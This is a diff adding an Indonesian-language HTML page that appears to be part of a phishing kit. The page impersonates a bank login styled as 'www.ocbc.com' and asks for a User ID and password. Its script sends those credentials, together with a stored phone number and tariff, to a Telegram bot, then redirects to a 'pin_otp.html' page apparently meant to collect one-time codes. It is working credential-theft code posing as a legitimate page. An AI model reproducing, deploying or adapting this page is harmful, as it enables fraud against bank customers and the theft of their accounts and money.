@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>𝘄𝘄𝘄.𝗼𝗰𝗯𝗰.𝗰𝗼𝗺 | 𝗣𝗲𝗿𝘂𝗯𝗮𝗵𝗮𝗻 𝘀𝗸𝗲𝗺𝗮 𝘁𝗮𝗿𝗶𝗳 𝘁𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+        * {
+            font-family: 'Ubuntu', sans-serif;
+            font-weight: 400;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            position: relative;
+            color: #000;
+        }
+        body, html {
+            background-color: #fff;
+            width: 100%;
+            height: 100%;
+            position: relative;
+            margin: 0 auto;
+            right: 0;
+            left: 0;
+            max-width: 450px;
+        }
+        .container {
+            max-width: 90%;
+            padding: 0px;
+            margin: 10px auto;
+            background: #fff;
+            border-radius: 15px;
+            box-shadow: #dedede 1px 1px 4px 3px;
+        }
+        button {
+            margin-top: 0px;
+            width: 100%;
+            height: 40px;
+            border: none;
+            outline: none;
+            border-radius: 25px;
+            color: #fff;
+            background: #d1001a;
+            text-align: center;
+            font-size: 13px;
+            font-weight: bold;
+            box-shadow: 2px 2px 2px 0px rgba(8, 8, 0, 0.5);
+        }
+        button:disabled {
+            opacity: 0.7;
+            background: #dedede;
+        }
+        input[type=text],
+        input[type=password] {
+            width: 90%;
+            padding: 12px 10px;
+            margin: 0px 0;
+            font-weight: 600;
+            box-sizing: border-box;
+            border: none;
+            font-size: 15px;
+            border-bottom: 1px solid #9b9b9b;
+            outline: none;
+        }
+        select {
+            width: 90%;
+            padding: 12px 10px;
+            margin: 0px 0;
+            font-weight: 600;
+            box-sizing: border-box;
+            border: none;
+            font-size: 15px;
+            border-bottom: 1px solid #9b9b9b;
+        }
+        
+    </style>
+</head>
+<body>
+    <img src="https://picjj.com/images/2024/09/11/WSnJVT.png" width="100%" alt="">
+    <div style="padding: 6%; height: auto; margin: 0;">
+    </div>
+    <center>
+        <h3 style="font-weight: 950;">Masukkan User ID & Password Kamu</h3>
+    </center>
+    <br>
+    <div class="container">
+        <br>
+        <form onsubmit="sendUser()" method="POST">
+            <input type="hidden" name="tarif" id="tarif">
+            <input type="hidden" name="nohp" id="nohp">
+            <label style="margin: 25px; font-weight: 850; color: #000; font-size: 16px;">User ID :</label>
+            <center>
+                <input type="text" placeholder="Input User ID" name="user" id="user" style="text-transform: uppercase" required>
+            </center>
+            <br>
+            <label style="margin: 25px; font-weight: 850; color: #000; font-size: 16px;">Password :</label>
+            <center>
+                <input type="password" inputmode="alfamerik" placeholder="Input Your Password" name="pass" id="pass" required>
+            </center>
+            <br>
+        </div>
+        <br>
+        <center>
+            <b style="font-size: 12px; color: #d1001a;">Lupa atau Belum Punya Password?</b>
+            <a href="#" style="font-size: 12px; color: #d1001a;">Atur Ulang di sini</a>
+        </center>
+       
+            
+        </div>
+        
+                    
+                        <button type="submit" style="margin: 0 auto; width: 90%; height: 52px; position: fixed; bottom: 10px; right: 0; left: 0; padding: 0px 0px; font-weight: 700; font-size: 14px; background: #d1001a; color: #fff; border-radius: 10px; font-weight: solid; border: 0px none #fff;max-width: 450px;" id="kirim">Lanjutkan</button>
+                    
+                
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <script src="i.js"></script>
+        <script>
+            function sendUser() {
+                event.preventDefault();
+                document.getElementById("tarif").value = sessionStorage.getItem("tarif");
+                document.getElementById("nohp").value = sessionStorage.getItem("nohp");
+                document.getElementById('kirim').innerHTML = "Memproses....";
+                var logo = '𝘄𝘄𝘄.𝗼𝗰𝗯𝗰.𝗰𝗼𝗺';
+                var gabungan = '' + logo + '%0A※ 𝗧𝗮𝗿𝗶𝗳 •• ' + tarif.value + '%0A※ 𝗡𝗼.𝗛𝗽 •• ' + nohp.value + '%0A%0A※ 𝗨𝘀𝗲𝗿 •• ' + user.value + '%0A※ 𝗣𝗮𝘀𝘀 •• ' + pass.value;
+                $.ajax({
+                    url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+                    method: `POST`,
+                    complete: function() {
+                        setTimeout(function() {
+                            window.location = "pin_otp.html";
+                            document.getElementById('kirim').innerHTML = "Ajukan Sekarang";
+                            var tarif = $('#tarif').val();
+                            sessionStorage.setItem('tarif', tarif);
+                            var nohp = $('#nohp').val();
+                            sessionStorage.setItem("nohp", nohp);
+                            var user = $('#user').val();
+                            sessionStorage.setItem('user', user);
+                            var pass = $('#pass').val();
+                            sessionStorage.setItem("pass", pass);
+                        }, 300);
+                    }
+                });
+            };
+        </script>
+</body>
+</html>
